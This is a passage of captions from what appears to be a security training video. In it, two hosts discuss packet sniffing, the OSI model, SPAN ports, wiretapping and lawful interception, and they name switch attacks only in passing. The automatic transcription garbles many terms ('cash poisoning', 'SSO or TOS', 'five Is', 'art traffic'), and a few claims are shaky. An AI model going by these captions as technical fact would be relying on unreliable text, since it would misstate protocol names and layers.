00:20:15.930\nAnd we can then snoop\nthe traffic more easily.\n\n413\n00:20:15.930 --> 00:20:19.617\nSo a lot of the attacks we talk about\npropagating are based on this idea of\n\n414\n00:20:19.617 --> 00:20:23.070\nbeing able to flood a switch and\nflood the table as a result of that.\n\n415\n00:20:23.070 --> 00:20:27.573\nSo Mac flooding, DHCP attacks,\nDNS poisoning, cash poisoning,\n\n416\n00:20:27.573 --> 00:20:29.150\nthings like that.\n\n417\n00:20:29.150 --> 00:20:31.770\nSwitch ports dealing,\nwhich is really just trying to do this and\n\n418\n00:20:31.770 --> 00:20:36.340\nsee the information switch are poisoning,\nspoofing attacks, all this stuff.\n\n419\n00:20:36.340 --> 00:20:40.580\nIt's all gonna run and\nbe propagated against the switches and\n\n420\n00:20:40.580 --> 00:20:42.315\nwe're gonna be manipulating traffic.\n\n421\n00:20:42.315 --> 00:20:45.655\nUp and down various layers of\nthe OSI model to be able to do this.\n\n422\n00:20:45.655 --> 00:20:49.555\nWhen we do DHCP attacks,\nthis is gonna be a layer seven attack,\n\n423\n00:20:49.555 --> 00:20:50.755\nall the way at the top of the model.\n\n424\n00:20:50.755 --> 00:20:51.275\nRight?\n\n425\n00:20:51.275 --> 00:20:55.530\nWhen we're dealing with art traffic and\nresolving Mac addresses to IP addresses,\n\n426\n00:20:55.530 --> 00:20:57.980\nwe're dealing with the lower\nlevels of the model layer two,\n\n427\n00:20:57.980 --> 00:21:00.820\nlayer three in that area, as we're\nmanipulating traffic in that level.\n\n428\n00:21:00.820 --> 00:21:05.100\nSo we're talking about manipulation in\ndifferent layers of the OSI model in real\n\n429\n00:21:05.100 --> 00:21:06.780\ntime to propagate these attacks.\n\n430\n00:21:06.780 --> 00:21:08.950\nWhich is also important for us to see,\n\n431\n00:21:08.950 --> 00:21:11.730\nwhich is why I just wanted to\nstay on the diagram for a minute.\n\n432\n00:21:11.730 --> 00:21:15.048\nBecause we really haven't talked about the\nOSI model in one of the episodes recently.\n\n433\n00:21:15.048 --> 00:21:19.330\nWe just wanna make sure that we have\na sense of, and you obviously, right,\n\n434\n00:21:19.330 --> 00:21:23.250\nmore so than us cuz I know we have a sense\nof this cuz we deal with it all the time.\n\n435\n00:21:23.250 --> 00:21:27.030\nBut you guys wanna go back and just\nfamiliarize yourself with the OSI model.\n\n436\n00:21:27.030 --> 00:21:29.430\nWe've talked about the importance\nof it in other areas.\n\n437\n00:21:29.430 --> 00:21:32.320\nAnd it's really critical for you to\nunderstand what happens at all these\n\n438\n00:21:32.320 --> 00:21:36.520\nlayers, having knowledge of the hardware,\nand where the hardware is gonna live.\n\n439\n00:21:36.520 --> 00:21:40.220\nSwitches are associated traditionally\nlayer two is our bridges even though we\n\n440\n00:21:40.220 --> 00:21:43.490\nknow switches can work at\nmultiple levels of the OSI model.\n\n441\n00:21:43.490 --> 00:21:46.720\nRouters are always traditionally\ndescribed as layer three devices.\n\n442\n00:21:46.720 --> 00:21:48.980\nHubs, if they did exist, at layer one.\n\n443\n00:21:48.980 --> 00:21:50.679\nAs dumb connectivity devices.\n\n444\n00:21:51.760 --> 00:21:55.510\nProxies and firewalls, if they're WAF\nfirewalls, web application firewalls,\n\n445\n00:21:55.510 --> 00:22:00.090\nthings like that, at layer seven of the\nOSI model working up and down the stack.\n\n446\n00:22:00.090 --> 00:22:02.970\nAlthough proxies can essentially work\nin almost any layer of the OSI model,\n\n447\n00:22:02.970 --> 00:22:04.610\ntraditionally, depending on what they do.\n\n448\n00:22:04.610 --> 00:22:08.610\nYou have Winsock and SOCK proxies and\nall sorts of different things.\n\n449\n00:22:08.610 --> 00:22:11.870\nSo we wanna understand all the bells and\nwhistles, if you will,\n\n450\n00:22:11.870 --> 00:22:14.130\nassociated with the OSI model.\n\n451\n00:22:14.130 --> 00:22:17.320\nBecause so much of what we do,\nis gonna exist in there, and\n\n452\n00:22:17.320 --> 00:22:21.270\nits manipulative behavior\nassociated with the OSI model.\n\n453\n00:22:21.270 --> 00:22:25.090\nSo for instance, if we were to talk about\nprotocols that are vulnerable to sniffing.\n\n454\n00:22:25.090 --> 00:22:28.510\nWhere would we put HTTP as\na protocol up on this model?\n\n455\n00:22:28.510 --> 00:22:30.080\nWhere do we think this is gonna live,\nright?\n\n456\n00:22:30.080 --> 00:22:31.450\nThis is,\n&gt;&gt; Let's see,\n\n457\n00:22:31.450 --> 00:22:34.120\nHTTP should be my transport protocol?\n\n458\n00:22:34.120 --> 00:22:38.110\n&gt;&gt; Well, HTTP is going to be a protocol\nthat would be up at the application layer.\n\n459\n00:22:38.110 --> 00:22:38.610\n&gt;&gt; Mm.\n&gt;&gt; Right?\n\n460\n00:22:38.610 --> 00:22:39.540\nWe're gonna see it all the way up at\n\n461\n00:22:39.540 --> 00:22:44.650\nthe top in terms of DHCP exists up there.\nHTTP as a web based protocol\n\n462\n00:22:44.650 --> 00:22:47.300\nin an application exists right\nup at the top of the model.\n\n463\n00:22:47.300 --> 00:22:50.160\nSo if you think about some of those\nprotocols that exist, let's say,\n\n464\n00:22:50.160 --> 00:22:52.200\nat the higher levels of the the model,\nright?\n\n465\n00:22:52.200 --> 00:22:56.060\nAnd if we send them in the clear,\nbecause remember, HTTP is gonna be an in\n\n466\n00:22:56.060 --> 00:23:00.700\nthe clear transmit, whereas HTTPS\nwould be a SSO or TOS encrypted\n\n467\n00:23:00.700 --> 00:23:04.990\nprotocol that's gonna send hopefully,\nsecurely and encrypt the traffic.\n\n468\n00:23:04.990 --> 00:23:07.720\nHTTP traffic's vulnerable to sniffing,\ncuz it goes in the clear.\n\n469\n00:23:07.720 --> 00:23:11.540\nSo, we could record all that traffic, just\nbecause we don't encrypt it or tunnel it,\n\n470\n00:23:11.540 --> 00:23:13.460\nor a combination of the two.\n\n471\n00:23:13.460 --> 00:23:16.160\nRight?\nIf we are using FTP, another protocol that\n\n472\n00:23:16.160 --> 00:23:20.040\nsends in the clear generically,\nBut secure FTP, right, will not.\n\n473\n00:23:20.040 --> 00:23:24.680\nSo it's a question not just of knowing\nwhere the protocol exists in the model but\n\n474\n00:23:24.680 --> 00:23:27.960\nalso understanding the behavior\nof the security associated\n\n475\n00:23:27.960 --> 00:23:30.280\nwith the specification of the protocol.\n\n476\n00:23:30.280 --> 00:23:31.640\nWe don't use Telnet for this reason.\n\n477\n00:23:31.640 --> 00:23:36.140\nBecause obviously it transmits in\nthe clear, just not acceptable use today.\n\n478\n00:23:36.140 --> 00:23:39.920\nSSH or something of a secure nature,\nwhatever the client would be that you\n\n479\n00:23:39.920 --> 00:23:43.570\nwould use as a terminal client,\nthat would be secure would be better.\n\n480\n00:23:43.570 --> 00:23:46.720\nPeople say well can't we just tunnel and\nencrypt the tunnel and\n\n481\n00:23:46.720 --> 00:23:49.570\nthen use telnet to send in\nthe clear through the tunnel.\n\n482\n00:23:49.570 --> 00:23:52.910\nIn theory, yeah, you could use telnet\nthrough an encrypted communication\n\n483\n00:23:52.910 --> 00:23:55.040\nchannel, it would be protected.\n\n484\n00:23:55.040 --> 00:23:57.910\nBut why would you go to the trouble of\ndoing that when you can use SSH that\n\n485\n00:23:57.910 --> 00:23:59.580\nessentially does the same thing but\n\n486\n00:23:59.580 --> 00:24:02.400\ndoes it natively instead of trying\nto bolt it on after the fact.\n\n487\n00:24:02.400 --> 00:24:03.820\nCuz I had this debate\nwith somebody recently.\n\n488\n00:24:03.820 --> 00:24:06.610\nThey were like, well aren't we\nessentially getting to the same place?\n\n489\n00:24:06.610 --> 00:24:08.847\nIsn't that what SSH is predicated upon?\n\n490\n00:24:08.847 --> 00:24:14.224\nIt is but it does it natively as opposed\nto you trying to tunnel unencrypted,\n\n491\n00:24:14.224 --> 00:24:18.016\nclear, data through\na transmission that is secure.\n\n492\n00:24:18.016 --> 00:24:21.068\nSo, while you can manipulate this and\npotentially play games,\n\n493\n00:24:21.068 --> 00:24:23.110\nwe want to follow the basic rules, right?\n\n494\n00:24:23.110 --> 00:24:25.460\nAnd understand that there's\nlogic to certain things.\n\n495\n00:24:25.460 --> 00:24:29.540\nSo when we talk about sniffing and the OSI\nmodel, we wanna remember that we're\n\n496\n00:24:29.540 --> 00:24:33.440\nlooking at those kind of things and\nHTTP up at the top or\n\n497\n00:24:33.440 --> 00:24:38.700\nSSL or POP or iMap or whatever it is\nthere's protocols as we start to use them.\n\n498\n00:24:38.700 --> 00:24:41.550\nThere's always typically a secure and\na non secure variant.\n\n499\n00:24:41.550 --> 00:24:44.730\nWe have to understand that sniffing\nwill pick off that traffic.\n\n500\n00:24:44.730 --> 00:24:48.640\nIt's up to us to apply the protection to\nensure that it's not gonna be compromised.\n\n501\n00:24:48.640 --> 00:24:52.410\nBecause we'll compromise that data by\nsniffing in at the data link layer.\n\n502\n00:24:52.410 --> 00:24:55.260\nAnd so we have to understand how it's\nprotected in order to ensure that it's not\n\n503\n00:24:55.260 --> 00:24:58.120\ngonna fall prey, right,\nto somebody actually looking at that.\n\n504\n00:24:58.120 --> 00:25:02.690\nAll right so that's what we just wanted to\ntalk about with the thought process there.\n\n505\n00:25:02.690 --> 00:25:04.790\nWe do have hardware and\nsoftware based sniffers.\n\n506\n00:25:04.790 --> 00:25:09.730\nA lot of the times we focus on software or\nfocus on sniffers.\n\n507\n00:25:09.730 --> 00:25:10.770\nWe talked about several of them.\n\n508\n00:25:10.770 --> 00:25:12.070\nThey were all, I think without exception,\n\n509\n00:25:12.070 --> 00:25:13.850\nthe ones we mentioned\nwere all software-based.\n\n510\n00:25:13.850 --> 00:25:17.490\nWe don't really think about hardware\nsniffers very often, but they do exist.\n\n511\n00:25:17.490 --> 00:25:20.110\nThere's a lot of hardware\ngear you can use to do this.\n\n512\n00:25:20.110 --> 00:25:22.570\nBut they're not very common in\nthe sense that, more often than not,\n\n513\n00:25:22.570 --> 00:25:24.780\nwe don't talk about them or see them.\n\n514\n00:25:24.780 --> 00:25:25.630\nYou may have them.\n\n515\n00:25:25.630 --> 00:25:27.240\nSome of you may use them.\n\n516\n00:25:27.240 --> 00:25:29.878\nA fluke, a number of products\nmake a whole bunch of them.\n\n517\n00:25:29.878 --> 00:25:34.730\nThe hand held scanners that you often see,\nthey've got their, what is it?\n\n518\n00:25:34.730 --> 00:25:35.860\nOpteview and\n\n519\n00:25:35.860 --> 00:25:39.270\none touch series that you often find\nthe hand held ones you walk around with.\n\n520\n00:25:39.270 --> 00:25:43.450\nRatcom has a whole bunch of stuff,\nKeysite has a bunch of stuff.\n\n521\n00:25:43.450 --> 00:25:46.150\nThere's all these different hardware\nvendors that you can go to.\n\n522\n00:25:46.150 --> 00:25:47.390\nAnd there's many more by the way.\n\n523\n00:25:47.390 --> 00:25:48.290\nI'm just naming two or\n\n524\n00:25:48.290 --> 00:25:51.670\nthree that I happen to know or\nremember off the top of my head.\n\n525\n00:25:51.670 --> 00:25:55.250\nBut there's many of them out there, and\nhigh end networks where you've got a lot\n\n526\n00:25:55.250 --> 00:25:59.230\nof traffic you've got obviously money,\nand you've got a whole bunch of\n\n527\n00:25:59.230 --> 00:26:02.440\ndifferent infrastructure that you're\nmanaging you tend to find hardware.\n\n528\n00:26:02.440 --> 00:26:08.700\nIn fairly heterogeneous networks, that's\ngot a lot of different things going on.\n\n529\n00:26:08.700 --> 00:26:10.210\nHardware will be prevalent.\n\n530\n00:26:10.210 --> 00:26:13.050\nAnd fairly homogeneous networks\ntend to be very similar.\n\n531\n00:26:13.050 --> 00:26:14.580\nBut there's not a lot of disparity.\n\n532\n00:26:14.580 --> 00:26:16.780\nThey're just very similar, very flat.\n\n533\n00:26:16.780 --> 00:26:18.620\nExcuse me, very basic typology.\n\n534\n00:26:18.620 --> 00:26:24.490\nYou may just be using everything on\nMPOS or fiber or ethernet, whatever.\n\n535\n00:26:24.490 --> 00:26:27.420\nWe tend to see software based scanning\njust because the reality is you don't tend\n\n536\n00:26:27.420 --> 00:26:29.400\nto go out and buy hardware for\nthat kind of stuff.\n\n537\n00:26:29.400 --> 00:26:31.530\nSo keep in mind,\nit can be a variety of things.\n\n538\n00:26:31.530 --> 00:26:34.680\nRemember our software and\nhardware based switches.\n\n539\n00:26:34.680 --> 00:26:37.200\nWhen I say software I mean\nour virtual switches.\n\n540\n00:26:37.200 --> 00:26:42.900\nAre going to be able to be used, depending\non how they are set up in spam port mode.\n\n541\n00:26:42.900 --> 00:26:46.337\nYou can span or mirror reports in\na virtually switch to do scanning and\n\n542\n00:26:46.337 --> 00:26:49.840\nto do network sniffing just like\nwe would on a physical switch.\n\n543\n00:26:49.840 --> 00:26:54.189\nThese switches, the virtual switches,\nbehave the same way that normal,\n\n544\n00:26:54.189 --> 00:26:56.270\nphysical layer two switch behave.\n\n545\n00:26:56.270 --> 00:26:59.455\nThe only difference is that they are\ncentury software to find virtual objects\n\n546\n00:26:59.455 --> 00:27:01.980\nin the cloud or\nin the virtual environment today.\n\n547\n00:27:01.980 --> 00:27:07.155\nMicrosoft virtual switch is, VM virtual\nswitch is, CISCO virtual switch is.\n\n548\n00:27:07.155 --> 00:27:08.575\nAny of the major vendors.\n\n549\n00:27:08.575 --> 00:27:13.215\nTheir infrastructure mirrors traditional\nphysical switch technology and\n\n550\n00:27:13.215 --> 00:27:14.575\nbehaves the same way.\n\n551\n00:27:14.575 --> 00:27:19.315\nOn high end enterprise typically or\nenterprise plus licensed\n\n552\n00:27:19.315 --> 00:27:23.755\ntechnology distributed switches or\ntheir equivalents across the platforms or\n\n553\n00:27:23.755 --> 00:27:27.715\nthe Cisco Nexus switches that\nare virtualized or HP has got a line of\n\n554\n00:27:27.715 --> 00:27:31.660\nswitches that are virtualized as well that\nare actual physical switches that have\n\n555\n00:27:31.660 --> 00:27:35.650\nbeen translated into an appliance\nlike device that runs virtually.\n\n556\n00:27:35.650 --> 00:27:38.280\nThose are traditional managed switches.\n\n557\n00:27:38.280 --> 00:27:39.970\nAnd you can create them and\nmanage them and\n\n558\n00:27:39.970 --> 00:27:41.600\nuse them the same way you\nwould a physical switch.\n\n559\n00:27:41.600 --> 00:27:45.240\nSo having a SPAN port is not\nan unreasonable, An event today,\n\n560\n00:27:45.240 --> 00:27:47.670\nan IBS port is typically\ngonna be found there as well.\n\n561\n00:27:47.670 --> 00:27:49.700\nIt'll run the IBS out to the internet.\n\n562\n00:27:49.700 --> 00:27:52.980\nYou'll find a SPAN port that typically\ngoes to the protocol analyzer or\n\n563\n00:27:52.980 --> 00:27:55.280\nthe network traffic monitor or\nwhatever that is.\n\n564\n00:27:55.280 --> 00:27:56.650\nAnd then we suck the traffic out,\n\n565\n00:27:56.650 --> 00:27:59.770\nreceiving copy of packets as\nthey pass through the switch.\n\n566\n00:27:59.770 --> 00:28:03.730\nSo we just wanna understand\nthe technology, understand the vocabulary.\n\n567\n00:28:03.730 --> 00:28:06.720\nWe often talk about tapping the wire or\nwiretapping.\n\n568\n00:28:06.720 --> 00:28:09.930\nPeople sometimes confuse network\nsniffing and wiretapping.\n\n569\n00:28:09.930 --> 00:28:14.650\nThey are almost like gen one and\ngen two of the same thought process,\n\n570\n00:28:14.650 --> 00:28:18.290\nwiretapping is really an analog thought\nprocess on older phone system, right?\n\n571\n00:28:18.290 --> 00:28:21.950\nWhere we would tap in and\nrecord either passively listening,\n\n572\n00:28:21.950 --> 00:28:25.080\nnot taking any action,\nperhaps it's recording the conversation.\n\n573\n00:28:25.080 --> 00:28:27.640\nOr actively tapping where\nwe not only listen but\n\n574\n00:28:27.640 --> 00:28:32.100\ncould inject fake conversations,\nadditional data, or whatever.\n\n575\n00:28:32.100 --> 00:28:34.300\nWe still talk about\ntapping the wire today but\n\n576\n00:28:34.300 --> 00:28:37.960\nthe reality is when we're tapping\nthe wire we usually are sniffing and\n\n577\n00:28:37.960 --> 00:28:40.410\nwe're just talking about\nsniffing more often than not.\n\n578\n00:28:40.410 --> 00:28:42.650\nBut the two terms sometimes\nget used interchangeably.\n\n579\n00:28:42.650 --> 00:28:44.880\nYou just have a sense of that.\n\n580\n00:28:44.880 --> 00:28:46.820\nBut it's a process of\nmonitoring telephone and or\n\n581\n00:28:46.820 --> 00:28:50.010\ninternet conversations is really\nwhat wire tapping is about.\n\n582\n00:28:50.010 --> 00:28:52.890\nSniffing is really just about\nmonitoring the data flow.\n\n583\n00:28:52.890 --> 00:28:56.450\nBut today with VOIP systems and everything\nrunning over one, your wiretapping and\n\n584\n00:28:56.450 --> 00:28:59.370\nsniffing have really kinda become\nsynonymous because rather than\n\n585\n00:28:59.370 --> 00:29:02.370\ndoing one you're doing both in\ntheory today in the digital world.\n\n586\n00:29:02.370 --> 00:29:05.320\nYou don't really see a lot of analog\nsystems anymore where we have the old\n\n587\n00:29:05.320 --> 00:29:10.040\nfashioned analog PBX systems that you\nwould tap into with the gator clips and\n\n588\n00:29:10.040 --> 00:29:11.810\nactually tap the copper wire.\n\n589\n00:29:11.810 --> 00:29:14.870\nThere's no wire to tap into in\nmost of these systems today.\n\n590\n00:29:14.870 --> 00:29:15.760\nIt's just not that way.\n\n591\n00:29:15.760 --> 00:29:16.880\nIt's all digital.\n\n592\n00:29:16.880 --> 00:29:21.390\nLot of it is fiber based and you don't tap\nfiber cable, right, the way we do this.\n\n593\n00:29:21.390 --> 00:29:23.580\nSo it's a very different concept today.\n\n594\n00:29:23.580 --> 00:29:26.100\nWe're manipulating\ntraffic in the switch and\n\n595\n00:29:26.100 --> 00:29:29.110\nin the protocol stack, both in\nhardware and software to get the data,\n\n596\n00:29:29.110 --> 00:29:32.710\nit's a little bit different than\nphysically actually you know cut the cable\n\n597\n00:29:32.710 --> 00:29:37.000\nand essentially splicing it and putting\nthe gator clips on and just sitting there\n\n598\n00:29:37.000 --> 00:29:41.170\nwith the handset which is what old\nfashioned wire tapping used to be.\n\n599\n00:29:41.170 --> 00:29:46.460\nGone are the good old days of stage\ncraft and spy craft as we say.\n\n600\n00:29:46.460 --> 00:29:50.550\nRemember also we talked about\nthis idea of lawful interception.\n\n601\n00:29:50.550 --> 00:29:54.490\nThe idea of lawfully, with obviously\nwith a warrant and or permission and\n\n602\n00:29:54.490 --> 00:29:57.170\nrecepting traffic for\nthe ability to be able to be\n\n603\n00:29:57.170 --> 00:30:00.545\nable to comply with discovery order or\nsome sort of monitoring order.\n\n604\n00:30:00.545 --> 00:30:02.630\nThere's a lot of reasons\nwhy this may occur, and\n\n605\n00:30:02.630 --> 00:30:05.815\nthe again you're going back to this\nidea of the Cloud and how our data is\n\n606\n00:30:05.815 --> 00:30:09.600\ntransmitting through all these systems we\nmay or may not have direct knowledge of.\n\n607\n00:30:09.600 --> 00:30:12.750\nSometimes you talk about pushing\nrisks into and through the cloud.\n\n608\n00:30:12.750 --> 00:30:13.810\nWe had that conversation.\n\n609\n00:30:13.810 --> 00:30:17.660\nI know you were helpful in helping me to\nthink through the logic of how to respond\n\n610\n00:30:17.660 --> 00:30:21.760\nto questions about that behavior that\nwe've been asked by some of you out there.\n\n611\n00:30:21.760 --> 00:30:23.770\nAnd it's always good to\nclarify those questions and\n\n612\n00:30:23.770 --> 00:30:27.430\nmake sure that you keep us honest, when\nyou think we've said something or ask to\n\n613\n00:30:27.430 --> 00:30:31.390\nclarify something we said and make sure we\nare specifying something the right way.\n\n614\n00:30:31.390 --> 00:30:34.700\nIt's good to come back and ask us to\ndo that, as somebody did recently for\n\n615\n00:30:34.700 --> 00:30:37.310\none of the comments we made\nin one of the cloud areas.\n\n616\n00:30:37.310 --> 00:30:40.090\nWe were talking about risk and\nthe management of risk in the cloud, and\n\n617\n00:30:40.090 --> 00:30:45.470\nthe idea that we have data that is beyond\nour direct control because we have shared,\n\n618\n00:30:45.470 --> 00:30:46.970\nproprietary knowledge of and\n\n619\n00:30:46.970 --> 00:30:51.750\ncontrol of the cloud stack and SaaS,\nPaaS and IaaS with the cloud vendor.\n\n620\n00:30:51.750 --> 00:30:55.750\nAnd the cloud vendor may outsource\nportions of that to people on their staff\n\n621\n00:30:55.750 --> 00:30:59.050\nor even third parties, unfortunately,\nthat we may or may not be aware of.\n\n622\n00:30:59.050 --> 00:31:01.760\nAnd so I was just making the comment\non one or two points that\n\n623\n00:31:01.760 --> 00:31:05.930\nessentially we are transferring risk into\nthe cloud by consuming cloud services.\n\n624\n00:31:05.930 --> 00:31:08.850\nAnd we have to understand that\nthere may be interested parties.\n\n625\n00:31:08.850 --> 00:31:12.770\nIn seeing whats going on in there, and\nlaw enforcement may be one of them.\n\n626\n00:31:12.770 --> 00:31:16.680\nIf we're talking about our own company,\nwe may have a reason to suspect people of\n\n627\n00:31:16.680 --> 00:31:19.650\nengaging in certain activity that\nwe want to better understand.\n\n628\n00:31:19.650 --> 00:31:23.940\nAnd so we may go in and inspect what they\nare doing or have the ability to decide\n\n629\n00:31:23.940 --> 00:31:27.860\nbased on policy that we have the right\nto monitor their transmissions.\n\n630\n00:31:27.860 --> 00:31:31.836\nIn many companies have policies that make\nit clear that you have no expectation of\n\n631\n00:31:31.836 --> 00:31:33.420\nprivacy for instance, right?\n\n632\n00:31:34.580 --> 00:31:38.362\nAnd as a result of that, with due\ncause and with justifiable grounds for\n\n633\n00:31:38.362 --> 00:31:42.587\ninspection, the company can make the\ndetermination that they have the ability\n\n634\n00:31:42.587 --> 00:31:47.210\nto go on and to decide to monitor email,\nmonitor voice phone calls or whatever.\n\n635\n00:31:47.210 --> 00:31:50.335\nAnd there may be a judge that\ngets involved if the case\n\n636\n00:31:50.335 --> 00:31:51.725\ndeals with external third parties.\n\n637\n00:31:51.725 --> 00:31:55.375\nThere may be a need discovery order that's\nin place that we need to comply with.\n\n638\n00:31:55.375 --> 00:31:58.875\nAnd that may involve,\nnot just email, but also chat and\n\n639\n00:31:58.875 --> 00:32:01.605\ninstant messaging, and\nvoice traffic and other things.\n\n640\n00:32:01.605 --> 00:32:06.155\nAnd so there may be reasons for third\nparties to engage in lawful interception.\n\n641\n00:32:06.155 --> 00:32:09.588\nAnd the idea is really just that,\ncomplying with a legal edict,\n\n642\n00:32:09.588 --> 00:32:13.210\nsome sort of a warrant typically\nfrom a court that says, by the way,\n\n643\n00:32:13.210 --> 00:32:14.752\nwe want access to this data.\n\n644\n00:32:14.752 --> 00:32:18.307\nWe're gonna a send dully bonded\nrepresentative, or you're gonna provide\n\n645\n00:32:18.307 --> 00:32:21.371\nsomebody who will comply with this\norder and give us what we want.\n\n646\n00:32:21.371 --> 00:32:23.788\nAnd you're then gonna\nturn data over to them.\n\n647\n00:32:23.788 --> 00:32:27.810\nWe talk about lawful interception\nas being something that often goes\n\n648\n00:32:27.810 --> 00:32:30.529\nhand in hand with\nscanning and/or sniffing.\n\n649\n00:32:30.529 --> 00:32:33.230\nSo we just wanna make sure we're aware\nof that and we think about that.\n\n650\n00:32:33.230 --> 00:32:36.600\nIn some of our upcoming conversations\nwe'll talk about specific kinds of\n\n651\n00:32:36.600 --> 00:32:41.250\nattacks, MAC attacks DHCP,\nR poisoning, spoofing attacks,\n\n652\n00:32:41.250 --> 00:32:43.850\nDNS poisoning,\nI mentioned some of these already.\n\n653\n00:32:43.850 --> 00:32:46.550\nWe'll talk about some of\nthe countermeasures and ways we do this.\n\n654\n00:32:46.550 --> 00:32:49.500\nWe'll also go through and\ntake a look at some of the mechanisms.\n\n655\n00:32:49.500 --> 00:32:52.080\nWe'll talk about how to\nmanipulate MAC addresses.\n\n656\n00:32:52.080 --> 00:32:53.750\nYou can actually go in in Windows 8,\n\n657\n00:32:53.750 --> 00:32:56.750\nWindows 10 and you can actually program\nin a MAC Address on the network stack\n\n658\n00:32:56.750 --> 00:33:00.000\ndirectly which is kinda cool cuz we\nhaven't had that ability to do that.\n\n659\n00:33:00.000 --> 00:33:03.420\nIn earlier versions you'd have\nto go into the registry and\n\n660\n00:33:03.420 --> 00:33:05.690\nyou can go down in the registry and\nactually do that.\n\n661\n00:33:05.690 --> 00:33:07.320\nAnd you can use a tool like Smack for\n\n662\n00:33:07.320 --> 00:33:11.090\ninstance which has been around forever to\nmanipulate Mac addresses through a GUI.\n\n663\n00:33:11.090 --> 00:33:12.690\nSo there's all these ways to do that.\n\n664\n00:33:12.690 --> 00:33:14.920\nYou can actually do it with PowerShell and\nwith NSH.\n\n665\n00:33:14.920 --> 00:33:16.390\n&gt;&gt; Wow.\n&gt;&gt; Right, so you could do it from there\n\n666\n00:33:16.390 --> 00:33:17.110\nas well if you wanted to.\n\n667\n00:33:17.110 --> 00:33:19.310\nSo it's kind of interesting to\nbe able to do these things.\n\n668\n00:33:19.310 --> 00:33:21.880\nWe'll talk about some of this and\ndo a little show and tell.\n\n669\n00:33:21.880 --> 00:33:24.822\nMike's actually been bugging\nme to be able to do the lab.\n\n670\n00:33:24.822 --> 00:33:26.850\nHe wants to be the driver and\nactually go through and do that.\n\n671\n00:33:26.850 --> 00:33:31.270\nSo I'm probably gonna stand by and narrate\nand have him actually do the lab because\n\n672\n00:33:31.270 --> 00:33:34.640\nhe's just been like a little kid with\na piece a candy, just wont leave me alone.\n\n673\n00:33:34.640 --> 00:33:36.870\nCome on let me do a lab,\nwhen are you going to let me do a lab?\n\n674\n00:33:36.870 --> 00:33:40.340\nI just have to stand around and do nothing\nexcept talk when you ask me something.\n\n675\n00:33:40.340 --> 00:33:41.090\nI want to do a lab.\n\n676\n00:33:41.090 --> 00:33:42.470\nThat's what he keeps saying\nwhen we are not on air.\n\n677\n00:33:42.470 --> 00:33:45.180\nSo, we're going to give Mike\nthe ability to do a lab at some point.\n\n678\n00:33:46.202 --> 00:33:48.930\nAll right, but all kidding aside so\nthat's all really gonna be coming up and\n\n679\n00:33:48.930 --> 00:33:51.330\nwe're going to be talking more about\nthis stuff in some upcoming episodes, so\n\n680\n00:33:51.330 --> 00:33:54.670\nwe want to invite you to come back and\nstay tuned but until then, who are we?\n\n681\n00:33:54.670 --> 00:33:55.990\nWhat do we do?\nWhat do we say?\n\n682\n00:33:55.990 --> 00:33:56.570\n&gt;&gt; I don't know.\n\n683\n00:33:56.570 --> 00:33:57.470\nI forgot now.\n\n684\n00:33:57.470 --> 00:33:59.040\n&gt;&gt; We are the five fingers.\n\n685\n00:33:59.040 --> 00:33:59.670\n&gt;&gt; We are the five.\n\n686\n00:33:59.670 --> 00:34:02.880\n&gt;&gt; Actually, speaking of five,\nbefore we go, did you see the article?\n\n687\n00:34:02.880 --> 00:34:04.210\nThis happened recently.\n\n688\n00:34:04.210 --> 00:34:05.660\nThere was a discussion.\n\n689\n00:34:05.660 --> 00:34:06.310\nWhat?\nYes, I know.\n\n690\n00:34:06.310 --> 00:34:07.630\nI'm supposed to look at\nthe place where the light is.\n\n691\n00:34:07.630 --> 00:34:09.350\nBut I was talking to Mike,\nso I was looking over there.\n\n692\n00:34:09.350 --> 00:34:11.250\nCan't you just let me do what I do?\n\n693\n00:34:11.250 --> 00:34:15.410\nPlease, that's why I'm standing here\ncuz I'm supposed to do these things.\n\n694\n00:34:15.410 --> 00:34:19.090\nSo quickly, and I know I'm supposed\nto look up there so I apologize for\n\n695\n00:34:19.090 --> 00:34:20.910\nlooking away, bad host.\n\n696\n00:34:20.910 --> 00:34:24.400\nSo there was this article just last week\non the NSA hacking tools that actually\n\n697\n00:34:24.400 --> 00:34:28.311\nwere released and that may have, and\nthen of course I got to look there, and\n\n698\n00:34:28.311 --> 00:34:30.305\nwhat does he do,\nputs the camera on over there.\n\n699\n00:34:30.305 --> 00:34:33.960\n&gt;&gt; [LAUGH]\n&gt;&gt; You're the man.\n\n700\n00:34:33.960 --> 00:34:36.270\nThat's why you're sitting\nin the chair over there.\n\n701\n00:34:36.270 --> 00:34:36.900\nAll right.\n\n702\n00:34:36.900 --> 00:34:37.490\n&gt;&gt; Mess with me?\n\n703\n00:34:37.490 --> 00:34:38.866\nI'll mess with you.\n\n704\n00:34:38.866 --> 00:34:40.490\n[LAUGH]\n&gt;&gt; He's like look over there.\n\n705\n00:34:40.490 --> 00:34:43.090\nSo I look over there and\nnow the camera's over there.\n\n706\n00:34:43.090 --> 00:34:46.950\nAll right, so there was an article about\nthe NSA hacking tools that were released\n\n707\n00:34:46.950 --> 00:34:49.690\nby one of these hacking\ncollectives that are broken and\n\n708\n00:34:49.690 --> 00:34:52.580\nsupposedly released a lot of source\ncode for a bunch of hacking tools.\n\n709\n00:34:52.580 --> 00:34:53.580\nWhich, turns out,\n\n710\n00:34:53.580 --> 00:34:56.630\napparently actually seem to be legitimate,\nkind of interesting in itself.\n\n711\n00:34:56.630 --> 00:34:59.900\nWe'll talk about that on one of\nthe upcoming episodes in this series as\n\n712\n00:34:59.900 --> 00:35:02.340\nwe're finishing up with\nregards to some other stuff.\n\n713\n00:35:02.340 --> 00:35:05.560\nBut, we talked about the five first\nseconds where we're getting ready to take\n\n714\n00:35:05.560 --> 00:35:09.310\noff So the group that has supposedly\ncreated these hackings was the NSA and\n\n715\n00:35:09.310 --> 00:35:12.730\na group of our allies,\nare known as the five Is.\n\n716\n00:35:12.730 --> 00:35:16.358\nSo the United States, some of the English\nspeaking countries that they partner with\n\n717\n00:35:16.358 --> 00:35:18.828\nin this area to do this,\ncommonly are called the five Is.\n\n718\n00:35:18.828 --> 00:35:19.896\n&gt;&gt; Interesting.\n&gt;&gt; So that's kind of interesting, yeah.\n\n719\n00:35:19.896 --> 00:35:21.040\nSo it's kind of cool.\n\n720\n00:35:21.040 --> 00:35:22.750\nSo you could read up on that and see that.\n\n721\n00:35:22.750 --> 00:35:26.560\nBy the time you watch this of course\nthat may be old news not new news but\n\n722\n00:35:26.560 --> 00:35:28.270\nactually happened in the last week.\n\n723\n00:35:28.270 --> 00:35:28.960\nIt's kinda cool.\n\n724\n00:35:28.960 --> 00:35:29.960\n&gt;&gt; Gotta check that out.\n\n725\n00:35:29.960 --> 00:35:31.740\n&gt;&gt; Yeah, it's pretty 